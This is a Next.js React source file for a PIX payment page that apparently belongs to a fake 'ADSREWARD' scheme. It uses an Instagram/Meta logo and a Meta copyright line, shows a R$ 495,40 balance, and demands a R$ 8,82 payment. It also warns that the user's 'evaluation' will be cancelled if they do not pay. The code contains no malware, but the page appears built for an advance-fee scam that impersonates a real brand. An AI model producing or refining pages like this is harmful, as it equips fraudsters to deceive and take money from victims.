"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Copy, RefreshCw, Check } from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import { getUTMParams } from "@/lib/utm-manager"

interface PixTransaction {
  id: string
  amount: number
  qr_code: string
  pix_code: string
  status: "pending" | "paid" | "expired"
  expires_at?: string
}

export default function PixPaymentPage() {
  const [transaction, setTransaction] = useState<PixTransaction | null>(null)
  const [loading, setLoading] = useState(true)
  const [checkingStatus, setCheckingStatus] = useState(false)
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>("")
  const [copied, setCopied] = useState(false)
  const [utmParams, setUtmParams] = useState<any>({})
  const { toast } = useToast()

  useEffect(() => {
    const params = getUTMParams()
    setUtmParams(params)
    console.log("[v0] UTM parameters captured:", params)

    createPixTransaction()
  }, [])

  useEffect(() => {
    if (transaction?.pix_code) {
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(transaction.pix_code)}`
      setQrCodeDataUrl(qrUrl)
    }
  }, [transaction?.pix_code])

  const createPixTransaction = async () => {
    try {
      const response = await fetch("/api/pix/create", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: 882,
          description: "Pagamento PIX - ADSREWARD",
          customer_name: "Cliente ADSREWARD",
          customer_email: "cliente@adsreward.com",
          utm_params: utmParams,
        }),
      })

      if (response.ok) {
        const data = await response.json()
        console.log("[v0] Transaction created with UTM params:", data)
        setTransaction(data)
      } else {
        const errorData = await response.json()
        console.error("[v0] Error creating transaction:", errorData)
      }
    } catch (error) {
      console.error("[v0] Erro ao criar transação PIX:", error)
    } finally {
      setLoading(false)
    }
  }

  const checkPaymentStatus = async () => {
    if (!transaction?.id || checkingStatus) return

    setCheckingStatus(true)
    try {
      const response = await fetch(`/api/pix/status/${transaction.id}`)

      if (response.status === 429) {
        toast({
          title: "Muitas tentativas",
          description: "Aguarde um momento antes de verificar novamente.",
          variant: "destructive",
        })
        return
      }

      if (response.ok) {
        const data = await response.json()

        if (data.status === "paid") {
          setTransaction((prev) => (prev ? { ...prev, status: "paid" } : null))
          toast({
            title: "Pagamento confirmado!",
            description: "Seu pagamento PIX foi processado com sucesso.",
          })
        } else {
          toast({
            title: "Status verificado",
            description: "Pagamento ainda pendente. Verifique novamente em alguns minutos.",
          })
        }
      } else {
        console.error(`[v0] API error: ${response.status}`)
        toast({
          title: "Erro ao verificar",
          description: "Não foi possível verificar o status do pagamento.",
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("[v0] Error checking status:", error)
      toast({
        title: "Erro de conexão",
        description: "Verifique sua conexão e tente novamente.",
        variant: "destructive",
      })
    } finally {
      setCheckingStatus(false)
    }
  }

  const copyPixCode = async () => {
    if (transaction?.pix_code) {
      try {
        console.log("[v0] Attempting to copy PIX code:", transaction.pix_code)

        if (navigator.clipboard && window.isSecureContext) {
          console.log("[v0] Using modern clipboard API")
          await navigator.clipboard.writeText(transaction.pix_code)
          console.log("[v0] Successfully copied using clipboard API")
        } else {
          console.log("[v0] Using fallback copy method")
          // Fallback for non-secure contexts
          const textArea = document.createElement("textarea")
          textArea.value = transaction.pix_code
          textArea.style.position = "fixed"
          textArea.style.left = "-999999px"
          textArea.style.top = "-999999px"
          document.body.appendChild(textArea)
          textArea.focus()
          textArea.select()

          const successful = document.execCommand("copy")
          console.log("[v0] Fallback copy successful:", successful)

          document.body.removeChild(textArea)

          if (!successful) {
            throw new Error("Fallback copy failed")
          }
        }

        console.log("[v0] Copy operation completed successfully")
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)

        toast({
          title: "Código PIX copiado!",
          description: "O código foi copiado para sua área de transferência.",
        })
      } catch (error) {
        console.error("[v0] Erro ao copiar código PIX:", error)

        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar automaticamente. Selecione e copie o código manualmente.",
          variant: "destructive",
        })

        try {
          const pixCodeElement = document.querySelector(".font-mono .break-all")
          if (pixCodeElement) {
            const range = document.createRange()
            range.selectNodeContents(pixCodeElement)
            const selection = window.getSelection()
            selection?.removeAllRanges()
            selection?.addRange(range)
            console.log("[v0] PIX code text selected for manual copying")
          }
        } catch (selectionError) {
          console.error("[v0] Could not select PIX code text:", selectionError)
        }
      }
    } else {
      console.log("[v0] No PIX code available to copy")
      toast({
        title: "Código não disponível",
        description: "O código PIX ainda não foi gerado.",
        variant: "destructive",
      })
    }
  }

  if (loading) {
    return (
      <div className="w-full bg-white rounded-none p-4 text-center shadow-xl">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-500 mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="bg-white shadow-sm p-4 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <img src="/images/design-mode/meta-logo.png" alt="Instagram Logo" className="object-contain w-24 h-12" />
        </div>
        <div className="bg-gradient-to-r from-pink-500 to-orange-400 text-white px-4 py-2 rounded-full text-sm font-medium">
          R$ 495,40
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-2">
        <Card className="w-full max-w-sm bg-white rounded-none p-4 text-center shadow-none border-none py-3.5">
          {/* Instagram Logo */}

          {/* Title */}
          <h1 className="text-xl font-bold text-gray-900 mb-0">PAGAMENTO PIX</h1>

          {/* Amount */}
          <div className="mb-5">
            <div className="bg-gradient-to-r from-pink-500 to-orange-400 text-white px-6 rounded-full inline-block text-lg font-bold py-0">
              R$ 8,82
            </div>
          </div>

          {/* QR Code */}
          <div className="mb-3">
            {qrCodeDataUrl ? (
              <img
                src={qrCodeDataUrl || "/placeholder.svg"}
                alt="QR Code PIX"
                className="w-36 h-36 mx-auto border border-gray-200"
                crossOrigin="anonymous"
              />
            ) : (
              <div className="w-36 h-36 mx-auto border border-gray-200 flex items-center justify-center text-gray-400">
                {loading ? "Gerando..." : "QR Code PIX"}
              </div>
            )}
          </div>

          {/* PIX Code */}
          <div className="mb-2">
            <p className="text-xs text-gray-600 mb-1">Código PIX:</p>
            <div className="bg-gray-100 p-2 rounded text-xs text-gray-700 font-mono">
              <div
                className="break-all overflow-hidden"
                style={{
                  display: "-webkit-box",
                  WebkitLineClamp: 2,
                  WebkitBoxOrient: "vertical",
                  lineHeight: "1.1em",
                  maxHeight: "2.2em",
                }}
              >
                {transaction?.pix_code || "00020126580014BR.GOV.BCB.PIX01363612345678901234567890123456789012345..."}
              </div>
              {transaction?.pix_code && transaction.pix_code.length > 60 && (
                <div className="text-gray-500 text-center mt-0.5 text-xs">...</div>
              )}
            </div>
          </div>

          {/* Copy Button */}
          <Button
            onClick={copyPixCode}
            className="w-full bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-semibold py-2.5 rounded-full mb-2 transition-all duration-200 text-sm"
          >
            {copied ? (
              <>
                <Check className="w-4 h-4 mr-2" />
                Código Pix Copiado!
              </>
            ) : (
              <>
                <Copy className="w-4 h-4 mr-2" />
                Copiar Código Pix
              </>
            )}
          </Button>

          {/* Warning Section */}

          {/* Reminder Section */}
          <div className="bg-pink-50 border border-pink-200 rounded-lg p-3 mb-0">
            <p className="text-pink-800 text-xs text-center">
              Lembrando: Caso não efetue o pagamento, sua avaliação será anulada e cancelada.
            </p>
          </div>

          {/* Loading Section */}
          <div className="mb-2 text-center">
            <p className="text-gray-600 text-sm mb-2">Aguardando pagamento...</p>
            <div className="flex justify-center gap-1">
              <div className="w-2 h-2 bg-pink-400 rounded-full animate-pulse"></div>
              <div className="w-2 h-2 bg-pink-400 rounded-full animate-pulse" style={{ animationDelay: "0.2s" }}></div>
              <div className="w-2 h-2 bg-pink-400 rounded-full animate-pulse" style={{ animationDelay: "0.4s" }}></div>
            </div>
          </div>

          {/* Check Status Button - Hidden to match design */}
          {transaction?.status !== "paid" && false && (
            <Button
              onClick={checkPaymentStatus}
              disabled={checkingStatus}
              className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold py-3 rounded-full mb-4 transition-all duration-200 text-base"
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${checkingStatus ? "animate-spin" : ""}`} />
              {checkingStatus ? "Verificando..." : "Verificar Pagamento"}
            </Button>
          )}
        </Card>
      </div>

      {/* Footer */}
      <div className="bg-white p-1 text-center text-xs text-gray-500">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}
